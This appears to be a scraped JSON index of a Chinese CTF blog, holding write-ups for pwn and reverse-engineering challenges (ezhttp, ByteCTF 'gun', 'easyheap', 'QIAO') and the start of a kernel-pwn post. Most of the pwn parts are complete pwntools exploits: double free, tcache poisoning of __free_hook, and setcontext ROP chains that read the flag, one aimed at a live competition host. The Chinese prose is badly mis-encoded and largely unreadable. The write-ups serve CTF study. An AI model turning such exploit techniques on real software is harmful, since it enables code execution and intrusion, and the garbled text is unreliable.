debug(0x0001A78) add('a'*0x1f+p32(0xfbad1801)+'a'*4 + 'a'*0x18 +'a') # p.recvuntil('a'*0x1f) libc.address=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,'\\x00'))-0x3ec761 success(&quot;libc: &quot;+hex(libc.address)) edit2(11,p64(0xfbad1800) + p64(0) * 3 +p8(0xc8)+'\\n') dele2(0) edit2(2,p64(libc.sym['__free_hook']-0x38)+'\\n') add2('a'*0x40) add2('a'*0x38+p64(libc.address+0x52145)[:6]) edit2(1,'/bin/sh\\x00\\n') heap -= 0x260 p_rdi = 0x2155f+libc.address p_rdx_rsi = 0x130889+libc.address p_rax = 0x43a78+libc.address syscall_ret = 0xd29d5+libc.address payload = '' payload += './flag'+'\\x00'*2 payload += p64(0)*12 #offset 0x68 payload += p64(0) #rdi payload += p64(heap+0x320+0xa0) #rsi payload += p64(heap+0x2000) #rbp payload += p64(0x200)*2 #rbx and rdx payload += p64(0)*2 payload += p64(heap+0x320+0xa8) # rsp payload += p64(p_rax) #rcx payload += p64(p_rax) payload += p64(0)+p64(syscall_ret) edit2(8,payload+'\\n') #gdb.attach(p) dele2(6) #pause() rop_chain = [ p_rdi,heap+0x320,p_rdx_rsi,0,0,p_rax,2,syscall_ret, p_rdi,4,p_rdx_rsi,0x100,heap+0x2000,p_rax,0,syscall_ret, p_rdi,1,p_rax,1,syscall_ret ] gdb.attach(p) p.send(&quot;A&quot;*0x28+flat(rop_chain)) p.interactive()if __name__ == '__main__': libc=ELF(&quot;./libc-2.27.so&quot;) # libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) main(0) libcä½¿ç”¨çš„æ—¶glibc all in oneé‡Œé¢çš„ï¼Œdownloadæ—¶å€™ä¹Ÿä¸€èµ·æŠŠdbgç¬¦å·ä¸€èµ·ä¸‹è½½äº†ï¼Œä¹‹åç¼–è¯‘ä¸€ä¸‹å°±èƒ½ç”¨äº†ã€‚","link":"/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91_Quals_ezhttp/"},{"title":"ByteCTFåˆèµ›","text":"ByteCTF2020 éƒ¨åˆ†pwn&amp;re æ¯”èµ›æ‰“äº†ä¸¤å¤©ï¼ŒæŒºæ¿€çƒˆçš„ï¼Œå°¤å…¶æœ€åæ—¶åˆ»å¤§å®¶éƒ½ç–¯ç‹‚å†²åˆ†ï¼Œæœ€åæ²¡èƒ½å®ˆä½æ‰åˆ°23äº†ğŸ¤¦ è¿™åœºæ¯”èµ›ç»™æˆ‘çš„æœ€æ·±çš„æ„Ÿå—æ˜¯æˆ‘çš„é€†å‘ç»éªŒå¤ªå°‘äº†ï¼Œå¯¼è‡´èŠ±è´¹äº†å¾ˆå¤šæ—¶é—´åœ¨æ²¡ç”¨çš„å‡½æ•°é‡Œï¼Œå€¼å¾—å¥½å¥½æ€»ç»“ã€‚ gunç¬¬ä¸€é“pwné¢˜ï¼Œå¤šäºruanå¸ˆå‚…çœ¼ç–¾æ‰‹å¿«å¸®æˆ‘æ”¹å¥½äº†æœ€åçš„ropï¼Œæ‹¿åˆ°äº†äºŒè¡€ï¼Œä¸ç„¶æˆ‘è¿˜å¾—è°ƒåŠå¤©ï¼Œè¿™ç§æœ€åçš„orwå¯ä»¥å½“ä½œæ¨¡æ¿æ¥ç”¨ï¼Œå¥½å¥½ä½“ä¼šä¸€ä¸‹ã€‚ é¢˜ç›®æ˜¯é“èœå•é¢˜ï¼Œ2.31çš„libcï¼ŒåŠŸèƒ½å¤§æ¦‚æ˜¯buy(è´­ä¹°å­å¼¹)â€“add 123456789101112131415161718192021222324__int64 buy(){ __int64 idx; // [rsp-18h] [rbp-18h] unsigned __int64 v2; // [rsp-10h] [rbp-10h] __asm { endbr64 } idx = sub_1542(); if ( idx &lt; 0 ) return puts_1(&quot;Enough&quot;); if ( qword_4070[3 * idx] == 1LL ) return puts_1(&quot;The bullet is Used!&quot;); puts_0(&quot;Bullet price: &quot;); v2 = sub_14E3(); if ( v2 &lt;= 0xF || (__int64)((__int64)off_4010 - v2) &lt; 0 ) return puts_1(&quot;Too pool!&quot;); if ( v2 &gt; 0x500 ) return puts_1(&quot;Too big!&quot;); *((_QWORD *)&amp;unk_4060 + 3 * idx) = sub_11A0(v2); qword_4070[3 * idx] = 1LL; puts_0(&quot;Bullet Name: &quot;); read_n(*((_QWORD *)&amp;unk_4060 + 3 * idx), v2); off_4010 = (__int64 (__fastcall *)())((char *)off_4010 - v2); return puts_1(&quot;Confirm&quot;);} load(å¡«å……å­å¼¹ï¼Œå³å°†heapé“¾æ¥ä¸€èµ·) 123456789101112131415__int64 sub_16E1(){ unsigned __int64 v1; // [rsp-10h] [rbp-10h] __asm { endbr64 } puts_0(&quot;Which one do you want to load?&quot;); v1 = sub_14E3(); if ( v1 &gt; 0xD || qword_4070[3 * v1] == 0LL || qword_4070[3 * v1] == 2LL ) return puts_1(&quot;what??&quot;); if ( qword_4050 ) *((_QWORD *)&amp;unk_4068 + 3 * v1) = qword_4050; qword_4050 = (__int64)&amp;unk_4060 + 24 * v1; *((_QWORD *)&amp;unk_4060 + 3 * v1 + 2) = 2LL; return puts_1(&quot;Confirm.&quot;);} shoot(å‘å°„å­å¼¹)â€“deleã€‚ 123456789101112131415161718192021222324__int64 sub_15F8(){ __int64 v1; // rsi int i; // [rsp-18h] [rbp-18h] __int64 v3; // [rsp-14h] [rbp-14h] __int64 v4; // [rsp-10h] [rbp-10h] __asm { endbr64 } if ( !qword_4050 ) return puts_1(&quot;No bullet!&quot;); puts_0(&quot;Shoot time: &quot;); v3 = (unsigned int)sub_14E3(); for ( i = 0; qword_4050 &amp;&amp; i &lt; (int)v3; ++i ) { v1 = *(_QWORD *)qword_4050; puts_0(&quot;Pwn! The %s bullet fired.\\n&quot;); sub_1100(*(_QWORD *)qword_4050, v1); v4 = qword_4050; qword_4050 = *(_QWORD *)(qword_4050 + 8); *(_QWORD *)(v4 + 16) = 0LL; } sub_159A(); return puts_0(&quot;%lld bullets left\\n&quot;);} åˆ†æheapçš„ç»“æ„ä½“ä¸ºï¼š 12345struct container{ void *heap_ptr void *next_heap int status //1ä¸ºå¯ç”¨ï¼Œ2ä¸ºä»¥è£…è½½ï¼Œ3ä¸ºfreeæ‰äº†} æ¼æ´ç‚¹åœ¨äºloadåä½¿ç”¨next_heapæŒ‡é’ˆå°†loadçš„å †å—è¿æ¥èµ·æ¥ï¼Œä½†shootä¹‹ånext_heapå¹¶ä¸ä¼šæ¸…é™¤ï¼Œè€Œä¸”heap_pträ¹Ÿæœªç½®0ï¼Œåªæ˜¯å°†å…¶freeå¹¶ä¿®æ”¹statusæ”¹ä¸º0ï¼Œä½†ä¹‹åæˆ‘ä»¬å¯ä»¥åªaddå›æ¥ä¸€ä¸ªä½†shootä¸¤ä¸ªï¼Œshootç¬¬äºŒä¸ªæ—¶ä¼šé€šè¿‡next_heapæ‰¾åˆ°é‚£ä¸ªå·²ç»freeçš„å †ï¼Œç”±äºæ²¡æœ‰å¯¹statusçš„æ£€æŸ¥å¯¼è‡´å¯ä»¥äºŒæ¬¡deleï¼Œä½†ç”±äº2.31åŠ å…¥äº†tecacheçš„keyæœºåˆ¶å¯¼è‡´tecache_attackæ— æ³•ä½¿ç”¨ã€‚ æ„é€ äºŒæ¬¡deleçš„poc: 12345678910add(0x60,'a'*8)add(0x500,'b'*8)add(0x60,'c'*8)load(1)load(0)shoot(1)add(0x60,'d'*8)shoot(1)load(0)shoot(2) #deleç¬¬äºŒ2ä¸ªæ—¶å¯¼è‡´double free tecacheçš„double freeæ— æ³•ä½¿ç”¨äº†ï¼Œä½†æ˜¯fastbinçš„å¯ä»¥é¸­ï¼Œå…ˆå¡«æ»¡tecacheï¼Œå†ç”¨ä¸Šé¢çš„æ–¹æ³•åœ¨fastbinæ„é€ double freeï¼Œä¹‹ååœ¨addæ—¶ä¼šå…ˆå–å‡ºtecacheé‡Œçš„binï¼Œå½“tecacheå–å®Œä¹‹åä¼šä»fastbinå–ï¼Œå½“ç¬¬ä¸€æ¬¡ä»fastbinå–æ—¶ï¼Œä¼šæŠŠå‰©ä¸‹çš„fastbinæ”¾å›tecacheï¼Œå› æ­¤æˆ‘ä»¬å°±èƒ½åˆ©ç”¨tecache attackæ‰“åˆ°free_hookã€‚ 1234567891011121314pwndbg&gt; binstcachebins0x70 [ 7]: 0x560f03853850 â€”â–¸ 0x560f038533b0 â€”â–¸ 0x560f03853420 â€”â–¸ 0x560f03853490 â€”â–¸ 0x560f03853500 â€”â–¸ 0x560f03853570 â€”â–¸ 0x560f038535e0 â—‚â€” 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x560f03853330 â€”â–¸ 0x560f038532c0 â—‚â€” 0x560f03853330 å…ˆåœ¨fastbin double free0x80: 0x0unsortedbinall: 0x560f038536b0 â€”â–¸ 0x7f6f3fdadbe0 (main_arena+96) â—‚â€” 0x560f038536b0smallbins ä¹‹åå–å®Œtecache 1234567891011121314pwndbg&gt; binstcachebinsemptyfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x561bb646c330 â€”â–¸ 0x561bb646c2c0 â—‚â€” 0x561bb646c3300x80: 0x0unsortedbinall: 0x561bb646c6b0 â€”â–¸ 0x7fc69a821be0 (main_arena+96) â—‚â€” 0x561bb646c6b0smallbins ç¬¬ä¸€æ¬¡å–fastbinæ—¶ï¼ˆä¹Ÿå³æ”¹fdï¼‰ï¼š 1234567891011121314pwndbg&gt; binstcachebins0x70 [ 3]: 0x556f27c2a2d0 â€”â–¸ 0x556f27c2a340 â€”â–¸ 0x7fe4fb1f0b28 (__free_hook) â—‚â€” 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x556f27c2a6b0 â€”â–¸ 0x7fe4fb1edbe0 (main_arena+96) â—‚â€” 0x556f27c2a6b0smallbins å¯ä»¥çœ‹åˆ°æ”¾å›tecacheäº†ï¼Œç”±äºæ²¡sizeæ£€æŸ¥ï¼Œå¯ä»¥æ‰“free_hookã€‚ exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110from pwn import *# context.log_level='debug'context.arch='amd64'def cmd(command): p.recvuntil(&quot;&gt; &quot;) p.sendline(str(command))def shoot(time): cmd(1) p.recvuntil(&quot;: &quot;) p.sendline(str(time))def load(idx): cmd(2) p.recvuntil(&quot;?&quot;) p.sendline(str(idx))def add(size,content): cmd(3) p.recvuntil(&quot;: &quot;) p.sendline(str(size)) p.recvuntil(&quot;: &quot;) p.sendline(content)def main(host,port=30772): global p if host: p=remote(host,port) else: p=process(&quot;./gun&quot;) p.recvuntil(&quot;: &quot;) p.sendline('1234') add(0x60,'a'*8) add(0x500,'b'*8) add(0x60,'c'*8) load(1) load(0) shoot(1) add(0x60,'d'*8) shoot(1) load(0) shoot(1) add(0x60,'d'*8) add(0x60,'e'*8) shoot(1) p.recvuntil(&quot;e&quot;*8) libc.address=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b'\\x00'))-0x1ec010 success(&quot;libc: &quot;+hex(libc.address)) for i in range(8): add(0x60,'f'*0x10) load(1) shoot(1) p.recvuntil(&quot;f&quot;*0x10) heap_addr=u64(p.recv(6).ljust(8,b'\\x00'))-0x330 success(&quot;heap: &quot;+hex(heap_addr)) add(0x60,'a'*8) load(2) load(3) load(4) load(5) load(6) load(7) load(8) shoot(7) load(1) shoot(1) load(0) shoot(2) for i in range(7): add(0x60,'a'*8) add(0x60,p64(libc.sym['__free_hook'])) add(0x60,'a') add(0x60,'a') add(0x60,p64(libc.address+0x0000000000154930)) # gdb.attach(p,&quot;b free\\nc&quot;) p_rdi=0x0000000000026b72+libc.address p_rsi=0x0000000000027529+libc.address p_rdx_r12=0x000000000011c371+libc.address p_rax=0x000000000004a550+libc.address syscall_ret=0x0000000000066229+libc.address payload = b&quot;/flag\\x00\\x00\\x00&quot;+p64(heap_addr+0x6c0) payload += b&quot;\\x00&quot;*0x10+p64(libc.sym[&quot;setcontext&quot;]+61) payload += p64(0)*8 #offset 0x68 payload += p64(0) #rdi payload += p64(heap_addr+0x6c0+0xa8) #rsi payload += p64(heap_addr+0x2000) #rbp payload += p64(0x200)*2 #rbx and rdx payload += p64(0)*2 payload += p64(heap_addr+0x6c0+0xa8) # rsp payload += p64(p_rax) #rcx payload += p64(p_rax) payload += p64(0)+p64(syscall_ret) add(0x180,payload) load(12) shoot(1) pause() rop_chain = [ p_rdi,heap_addr+0x6c0,p_rdx_r12,0,0,p_rsi,0,p_rax,2,syscall_ret, p_rdi,3,p_rdx_r12,0x100,0,p_rsi,heap_addr+0x2000,p_rax,0,syscall_ret, p_rdi,1,p_rax,1,syscall_ret ] p.send(b&quot;A&quot;*0x20+flat(rop_chain)) p.interactive()if __name__ == '__main__': libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) main(&quot;123.57.209.176&quot;) easyheapè¿™é“æ˜¯ruanå¸ˆå‚…åšçš„ï¼Œæˆ‘èµ›åå¤ç°äº†ä¸€ä¸‹ ç»å…¸èœå•é¢˜ï¼Œæ´åœ¨addé‡Œï¼š 1234567891011121314151617181920212223242526272829303132333435 printf(&quot;Size: &quot;); __isoc99_scanf(&quot;%hd&quot;, &amp;size); // %hd è¡¨ç¤ºä¸ºçŸ­æ•´å‹2ä¸ªå­—èŠ‚ v2 = size; if ( size &lt;= 0 || size &gt; 0x80 ) { do { do { puts(&quot;Invalid size.&quot;); printf(&quot;Size: &quot;); __isoc99_scanf(&quot;%hd&quot;, &amp;size); } while ( size &lt;= 0 ); } while ( size &gt; 0x80 ); } else { v2 = size; } ptr = malloc(size); if ( !ptr ) { puts(&quot;Malloc error.&quot;); exit(2); } memset(ptr, 0, size); printf(&quot;Content: &quot;); read_n((__int64)ptr, size); // v2æ˜¯ç¬¬ä¸€æ¬¡è¾“å…¥çš„sz *((_BYTE *)ptr + v2 - 1) = 0; *((_DWORD *)&amp;unk_4060 + 4 * i) = size; heaplist[2 * i] = ptr; puts(&quot;Finish.&quot;);} å¯ä»¥çœ‹åˆ°ï¼Œv2æ˜¯ç¬¬ä¸€æ¬¡è¾“å…¥çš„sizeï¼Œå¦‚æœè¿™ä¸ªsizeæ˜¯ä¸ç¬¦åˆæ¡ä»¶çš„ï¼Œå°±èƒ½åœ¨æ‰§è¡Œ*((_BYTE *)ptr + v2 - 1) = 0;æ—¶å‘ä¸Šå†™å…¥ä¸€ä¸ªâ€™\\0â€™ï¼Œå¯ä»¥ç”¨æ¥æ”¹binçš„fdï¼Œä»¥æ„é€ overlopã€‚ leakæ˜¯å…ˆæ„é€ tecache_dupï¼ˆå³ä¸€ä¸ªbinæ—¢åœ¨tecacheï¼Œåˆåœ¨fastbinï¼Œåˆ©ç”¨çš„å°±æ˜¯ä¸Šé¢çš„æ€è·¯ï¼‰é€šè¿‡è§¦å‘malloc_consoildateå°†fastbinæ”¾å…¥unsoretdbinï¼Œä»è€Œleak main_arenaã€‚ 1234567891011121314151617181920add(0x50,'a'*8)dele(0)for i in range(8): add(0x40,'a'*8)for i in range(1,8): dele(i)dele(0)cmd(1)p.recvuntil(&quot;: &quot;)p.sendline(str(0x10000-0xf0+1))add_(0x40,&quot;b&quot;*8)for i in range(3): add(0x40,'a'*8)add(0x40,p64(0))p.recvuntil(&quot;&gt;&gt; &quot;)p.sendline(&quot;1&quot;*0x400)show(4)offset=0x1ebc20p.recvuntil(&quot;: &quot;)libc.address = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8,b'\\x00'))-offset ä¹‹åè¿˜æ˜¯ä¸Šé¢çš„æ€è·¯æ„é€ overlopã€‚é€šè¿‡æ”¹fdçš„ä½å­—èŠ‚ä¸ºâ€™\\x00â€™ä½¿å¾—chunk-&gt;fdæŒ‡å‘çš„åœ°å€åœ¨chunkä¸‹é¢ï¼ˆè·ç¦»å°äºchunkçš„sizeï¼‰ï¼Œå¯¼è‡´overlopã€‚ ä¹‹åtecache attackæ‰“free_hookã€‚ expï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *context.log_level='debug'context.arch='amd64'def cmd(command): p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(command))def add(sz,content): cmd(1) p.recvuntil(&quot;: &quot;) p.sendline(str(sz)) p.recvuntil(&quot;: &quot;) p.sendline(content)def add_(sz,content): p.recvuntil(&quot;: &quot;) p.sendline(str(sz)) p.recvuntil(&quot;: &quot;) p.sendline(content)def show(idx): cmd(2) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))def dele(idx): cmd(3) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))def main(host, port = 1234): global p if host: p = remote(host, port) else: p = process(&quot;./easyheap&quot;) add(0x50,'a'*8) dele(0) for i in range(8): add(0x40,'a'*8) for i in range(1,8): dele(i) dele(0) cmd(1) p.recvuntil(&quot;: &quot;) p.sendline(str(0x10000-0xf0+1)) add_(0x40,&quot;b&quot;*8) for i in range(3): add(0x40,'a'*8) add(0x40,p64(0)) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(&quot;1&quot;*0x400) show(4) offset=0x1ebc20 p.recvuntil(&quot;: &quot;) libc.address = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8,b'\\x00'))-offset success(&quot;libc: &quot;+hex(libc.address)) for i in range(4): dele(i) add(0x30,'a'*8) add(0x60,'a'*8) dele(1) cmd(1) p.recvuntil(&quot;: &quot;) p.sendline(str(0x10000-0xa0+1)) add_(0x60,&quot;a&quot;*8) dele(1) for _ in range(2): add(0x40,'a') payload=b'a'*0x10+p64(0)+p64(0x51)+p64(libc.sym['__free_hook']) add(0x40,payload) add(0x40,'/bin/sh') add(0x40,p64(libc.sym['system'])) dele(5) gdb.attach(p) p.interactive()if __name__ == &quot;__main__&quot;: libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) main(0) QIAOè¿™é¢˜è‚äº†å¥½ä¹…ï¼Œå¹¶ä¸æ˜¯å®ƒéš¾ï¼Œè€Œæ˜¯åƒäº†é€†å‘ç»éªŒåŒ®ä¹çš„äºã€‚é¦–å…ˆè¿™é¢˜èŠ±æŒ‡ä»¤å¾ˆå¤šâ€jmp $+5â€å¯¼è‡´idaæ— æ³•åç¼–è¯‘ï¼Œé‚£å°±ç›´æ¥ä¸Šæ‰‹è°ƒäº†ã€‚mainå‡½æ•°å¼€å§‹å…ˆæŠŠä¸€ä¸ªå¤§æ•°æ”¾å…¥stacké‡Œï¼š 1mov dword ptr [rbp-34h], 0B63C9FE1h ä¹‹åé€šè¿‡è°ƒè¯•ä¼šä¸æ–­çš„å°†è¿™ä¸ªæ•°å’Œå…¶ä»–çš„æ•°è¿›è¡Œæ¯”è¾ƒï¼Œç›¸ç­‰çš„è¯å°±è·³è½¬ã€‚ 1234567891011121314 mov eax, [rbp-38h].text:00000000004019FD sub eax, 0B63C9FE1h.text:0000000000401A02 mov [rbp-50h], eax.text:0000000000401A05 jz loc_401ADB.text:0000000000401A0B jmp $+5 loc_401ADB: ; CODE XREF: .text:0000000000401A05â†‘j.text:0000000000401ADB mov eax, 501DC785h.text:0000000000401AE0 mov ecx, 44AF965Fh.text:0000000000401AE5 mov edx, [rbp-4].text:0000000000401AE8 cmp edx, 2.text:0000000000401AEB cmovnz eax, ecx.text:0000000000401AEE mov [rbp-34h], eax.text:0000000000401AF1 jmp loc_401DA7 è¿™ä¸ªè·³è½¬åˆ°loc_401ADBè¿›è¡Œçš„æ˜¯æ¯”è¾ƒçš„æ“ä½œï¼Œåˆ†æå¾—æ˜¯å¯¹argcçš„æ£€æŸ¥ï¼Œå¦‚æœä¸º2å°±é€šè¿‡ã€‚ ä¹‹åæ›´æ–°è¿™ä¸ªå¤§æ•°ä¸º501DC785hï¼Œå¹¶ç»§ç»­å’Œå…¶ä»–æ•°æ¯”è¾ƒï¼Œç›¸ç­‰çš„è¯å°±è·³è½¬ã€‚ 1234567891011121314151617181920.text:0000000000401A94 mov eax, [rbp-38h].text:0000000000401A97 sub eax, 501DC785h.text:0000000000401A9C mov [rbp-6Ch], eax.text:0000000000401A9F jz loc_401B1D.text:0000000000401AA5 jmp $+5.text:0000000000401B1D loc_401B1D: ; CODE XREF: .text:0000000000401A9Fâ†‘j.text:0000000000401B1D mov eax, 874FBE3Fh.text:0000000000401B22 mov ecx, 0B6DAB60Eh.text:0000000000401B27 mov rdx, [rbp-28h].text:0000000000401B2B mov rdi, [rdx+8].text:0000000000401B2F mov [rbp-7Ch], eax.text:0000000000401B32 mov [rbp-80h], ecx.text:0000000000401B35 call _strlen.text:0000000000401B3A cmp rax, 20h ; ' '.text:0000000000401B3E mov ecx, [rbp-7Ch].text:0000000000401B41 mov esi, [rbp-80h].text:0000000000401B44 cmovnz ecx, esi.text:0000000000401B47 mov [rbp-34h], ecx.text:0000000000401B4A jmp loc_401DA7 è·³åˆ°loc_401B1Dï¼Œcalläº†strlenï¼Œå®Œæˆçš„æ˜¯å¯¹argsçš„é•¿åº¦è¿›è¡Œæ¯”è¾ƒï¼Œä¸º0x20å³é€šè¿‡ã€‚ å¤§æ•°æ›´æ–°ä¸º874FBE3Fhï¼Œä¹‹åå†æ¯”è¾ƒè·³åˆ°äº†ï¼š 123456789101112131415.text:0000000000401B79 loc_401B79: ; CODE XREF: .text:0000000000401997â†‘j.text:0000000000401B79 mov eax, 8F7A1A66h.text:0000000000401B7E mov ecx, 2D33904h.text:0000000000401B83 mov dword ptr [rbp-10h], 1BDh.text:0000000000401B8A mov dword ptr [rbp-14h], 63h ; 'c'.text:0000000000401B91 mov edx, [rbp-10h].text:0000000000401B94 mov esi, [rbp-14h].text:0000000000401B97 imul edx, edx.text:0000000000401B9A add edx, 1.text:0000000000401B9D imul esi, esi.text:0000000000401BA0 imul esi, 7.text:0000000000401BA3 cmp edx, esi.text:0000000000401BA5 cmovz eax, ecx.text:0000000000401BA8 mov [rbp-34h], eax.text:0000000000401BAB jmp loc_401DA7 æ„Ÿè§‰å•¥ä¹Ÿæ²¡å¹²ï¼Œå°±æ›´æ–°äº†å¤§æ•°ä¸º8F7A1A66hï¼Œå†è·³ï¼š 12345678910111213.text:0000000000401C0C loc_401C0C: ; CODE XREF: .text:00000000004019C3â†‘j.text:0000000000401C0C mov rax, [rbp-28h].text:0000000000401C10 mov rdi, [rax+8].text:0000000000401C14 call sub_401180.text:0000000000401C19 mov [rbp-30h], rax.text:0000000000401C1D mov rdi, [rbp-30h].text:0000000000401C21 call sub_4018C0.text:0000000000401C26 mov ecx, 0BC6F950Fh.text:0000000000401C2B mov edx, 3B7E9E40h.text:0000000000401C30 cmp eax, 0.text:0000000000401C33 cmovnz ecx, edx.text:0000000000401C36 mov [rbp-34h], ecx.text:0000000000401C39 jmp loc_401DA7 è¿™ä¸ªåœ°æ–¹æ˜¯å…³é”®éƒ¨åˆ†ã€‚ ä¸€èˆ¬è¿™ç§è¦æˆ‘ä»¬è¾“å…¥çš„é€†å‘é¢˜ä¼šå¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œå˜å½¢ï¼Œç„¶åè¿›è¡Œæ¯”è¾ƒï¼Œç»åˆ†æå‘ç°sub_401180å®Œæˆçš„å°±æ˜¯å¯¹è¾“å…¥è¿›è¡Œå˜å½¢ã€‚ å¦‚æˆ‘ä»¬è¾“å…¥â€™aâ€™*0x20,å†…å­˜ä¸­â€™aâ€™å 1ä¸ªå­—èŠ‚ï¼Œè€Œå˜å½¢åâ€™aâ€™è¡¨æ˜¯16è¿›åˆ¶çš„0xaï¼Œåªå 4bitï¼Œä»è€Œå˜å½¢ä¸ºé•¿åº¦ä¸º0x10çš„â€™aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaâ€™(å†…å­˜ä¸­)ã€‚ 123pwndbg&gt; x/20gx 0x4242900x424290: 0x0000000000000000 0x00000000000000210x4242a0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa è€Œsub_4018C0ç†è®ºä¸Šåº”è¯¥æ˜¯æ¯”è¾ƒå‡½æ•°ï¼Œè€Œä¸”åˆ†æå‘ç°å‡½æ•°çš„è¿”å›åeaxä¼šå’Œ1æ¯”è¾ƒï¼Œä¸º1å°±è¡¨ç¤ºé€šè¿‡ã€‚ä½†è¿™ä¸ªå‡½æ•°åç¼–è¯‘åååˆ†å¤æ‚ï¼Œæ„Ÿè§‰ä¸åƒäººå†™çš„ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥æ”¾æ”¾å¼ƒé™æ€åˆ†æï¼ˆå®é™…ä¸Šé™æ€åˆ†æäº†å¥½ä¹…åˆ†æäº†ä¸ªå¯‚å¯ï¼‰ã€‚ é€šè¿‡è°ƒè¯•å‘ç°sub_4018C0æ‰§è¡Œå®Œåä¼šé‡Šæ”¾ä¸€ä¸ªå †å—ï¼Œè€Œä¸”å †ä¸­å¤šäº†å¥½å¤šå¥‡æ€ªçš„å†…å®¹ï¼Œå¹¶ä¸”å’Œæˆ‘ä»¬çš„è¾“å…¥æ²¡æœ‰å…³ç³»ã€‚äºæ˜¯æˆ‘çŒœæµ‹å°±æ˜¯å’Œå †é‡Œçš„å†…å®¹æ¯”è¾ƒï¼Œäºæ˜¯åœ¨freeä¸‹æ–­å¾—åˆ°å †é‡Œçš„æ•°æ®ä¸º7fa392e666d78abbb655165528fff33fï¼ˆç»è¿‡å¤§å°ç«¯å˜æ¢åçš„ï¼‰ 123pwndbg&gt; x/20gx 0x4242b0 //å°†è¦freeçš„å †0x4242b0: 0x0000000000000000 0x00000000000000210x4242c0: 0xbb8ad766e692a37f 0x3ff3ff28551655b6 å°†å…¶ä½œä¸ºè¾“å…¥æœç„¶è¿”å›ä¸º1ï¼Œä¹‹åå°±é¡ºåˆ©æ‹¿åˆ°flagäº†ã€‚ğŸš© è¿˜æœ‰ä¸€é“goçš„pwné¢˜è¿˜æ²¡å¤ç°å¥½ï¼Œä¹‹åä¼šå•ç‹¬å†™ä¸€ç¯‡ï¼Œruanå¸ˆå‚…tqlâœ¨ è¿™åœºæ¯”èµ›æ‰“ä¸‹æ¥æ”¶è·é¢‡å¤šï¼Œä½†çœ‹ç€å¤§æŠŠçš„å®‰å“é€†å‘å®å±éš¾å—ï¼Œå…¶å®æˆ‘ä»¬å †çš„pwnå’Œwebè§£å‡ºçš„é¢˜ç›®æ•°é‡å’Œå‰é¢çš„é˜Ÿä¼å·®ä¸å¤šçš„ï¼Œä¸»è¦åƒäºåœ¨re,cryptoå’Œmiscï¼Œè¯´åˆ°åº•è¿˜æ˜¯è‡ªå·±ä¸å¤Ÿå¼ºã€‚keep it upğŸ±â€ğŸ‘¤","link":"/2020/10/26/ByteCTF2020%E5%88%9D%E8%B5%9B/"},{"title":"kernel_pwn SringsIPC(P1)","text":"Kernel_pwn SringsIPC(P1) ä»ä»»æ„åœ°å€è¯»å†™åˆ°ææƒçš„ä¸‰ç§æ–¹æ³•ï¼š1.ä¿®æ”¹credç»“æ„ä½“2.æ”¹å†™vdsoæ˜ å°„å‡½æ•°+åå¼¹shell3.åŠ«æŒprctlæ‰§è¡Œè¿‡ç¨‹çš„hp-&gt;hookæŒ‡é’ˆ è¿™é“é¢˜æ¥è‡ªcsaw-2015-ctfä¹Ÿæ˜¯ä¸€é“ç»å…¸çš„å†…æ ¸é¢˜äº†ï¼ŒèŠ±äº†è›®ä¹…çš„æ—¶é—´å»å¤ç°ğŸ¤¦ è¿™é¢˜åªç»™äº†ç¨‹åºçš„æºä»£ç main.cï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ­å»ºç¯å¢ƒã€‚æˆ‘æ˜¯æ‡’ç‹—ï¼Œç›´æ¥ç”¨äº†p4ndaå¸ˆå‚…çš„é•œåƒå’Œæ–‡ä»¶ç³»ç»Ÿï¼ˆååˆ†æ„Ÿè°¢ï¼ğŸ˜ï¼‰ã€‚æ ¹æ®é¢˜ç›®çš„åå­—çŒœæµ‹å¯èƒ½æ˜¯å®ç°äº†è¿›ç¨‹é—´é€šä¿¡è¿‡ç¨‹ä¸­çš„çš„ä¿¡ç®±æœºåˆ¶ï¼ˆæ­£å¥½æœ€è¿‘åœ¨åšæ“ä½œç³»ç»Ÿçš„IPCå®éªŒï¼‰ï¼Œä½†å®é™…ä¸Šæ˜¯æˆ‘æƒ³å¤šäº†ã€‚ åˆ†ææºç å‘ç°ç¨‹åºå®ç°äº†å¯¹ä¸€ç‰‡å†…å­˜åŒºåŸŸçš„ç”³è¯·ï¼Œé‡Šæ”¾ï¼Œè¯»å†™ï¼Œæ‰©å®¹ï¼ŒæŸ¥å¯»æ“ä½œã€‚æ¼æ´ç‚¹åœ¨æ‰©å®¹æ“ä½œ(realloc)å‡½æ•°ä¸­ï¼š 1234567891011121314151617181920212223242526static int realloc_ipc_channel ( struct ipc_state *state, int id, size_t size, int grow ){ struct ipc_channel *channel; size_t new_size; char *new_data; channel = get_channel_by_id(state, id); if ( IS_ERR(channel) ) return PTR_ERR(channel); if ( grow ) new_size = channel-&gt;buf_size + size; else new_size = channel-&gt;buf_size - size; new_data = krealloc(channel-&gt;data, new_size + 1, GFP_KERNEL); if ( new_data == NULL ) return -EINVAL; channel-&gt;data = new_data; channel-&gt;buf_size = new_size; ipc_channel_put(state, channel); return 0;} 